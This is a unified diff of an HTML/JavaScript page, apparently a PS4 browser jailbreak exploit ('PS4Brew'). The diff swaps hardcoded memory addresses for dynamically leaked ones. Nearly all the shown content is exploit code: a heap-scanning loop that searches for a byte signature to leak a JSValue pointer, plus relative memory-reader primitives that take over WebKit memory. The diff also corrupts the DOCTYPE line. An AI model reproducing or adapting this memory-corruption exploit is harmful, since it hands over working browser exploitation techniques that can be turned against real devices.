@@ -1,4 +1,4 @@
-<!DOCTYPE html><html><head><title>PS4Brew 5.05 test à utiliser comme 9.00</title><meta name=viewport content="width=device-width, initial-scale=1"><style>.loader{position:absolute;left:50%;top:50%;margin:-75px 0 0 -75px;border:10px solid #f3f3f3;
+DOCTYPE html><html><head><title>PS4Brew 5.05 comme 9.00</title><meta name=viewport content="width=device-width, initial-scale=1"><style>.loader{position:absolute;left:50%;top:50%;margin:-75px 0 0 -75px;border:10px solid #f3f3f3;
 border-radius:50%;
 border-top:10px solid #044595;
 border-left:10px solid #044595;
@@ -197,7 +197,7 @@ function makeReader(read_addr, ffs_name)
     return relative_read;
 }
 
-var fastmalloc = makeReader(0x205354f84, 'ffs3'); //read from leaked string ptr
+var fastmalloc = makeReader(leak, 'ffs3'); //read from leaked string ptr
 alert("fastmalloc.length = "+fastmalloc.length);
 
 for(var i = 0; i < 100000; i++)
@@ -210,15 +210,22 @@ for(var i = 0; i < 0x400; i++)
     props.push({value: jsvalue});
 }
 
-var jsvalue_leak = 0x2019efea0;
+var jsvalue_leak = null;
 
 while(jsvalue_leak === null)
 {
     Object.defineProperties({}, props);
     for(var i = 0; i < 0x100000; i++)
     {
-        if(fastmalloc.length == 4294967295
-       
+        if(fastmalloc.charCodeAt(i) == 0x42
+        && fastmalloc.charCodeAt(i+1) == 0x44
+        && fastmalloc.charCodeAt(i+2) == 0x43
+        && fastmalloc.charCodeAt(i+3) == 0x41
+        && fastmalloc.charCodeAt(i+4) == 0
+        && fastmalloc.charCodeAt(i+5) == 0
+        && fastmalloc.charCodeAt(i+6) == 254
+        && fastmalloc.charCodeAt(i+7) == 255
+        && fastmalloc.charCodeAt(i+24) == 14
         )
         {
             jsvalue_leak = stringToPtr(fastmalloc, i+32);
@@ -230,9 +237,9 @@ while(jsvalue_leak === null)
 alert("jsvalue leak: " + jsvalue + " -> " + hex(jsvalue_leak));
 
 var rd_leak = makeReader(jsvalue_leak, 'ffs4');
-var array256 = 0x201cc0fd0; //arrays[256]
-var ui32a = 0x2019fbe80; //Uint32Array
-var sanity = 0x07;
+var array256 = stringToPtr(rd_leak, 16); //arrays[256]
+var ui32a = stringToPtr(rd_leak, 24); //Uint32Array
+var sanity = stringToPtr(rd_leak, 32);
 alert("array256="+hex(array256)+" ui32a="+hex(ui32a)+" sanity="+hex(sanity));
 
 var rd_arr = makeReader(array256, 'ffs5');
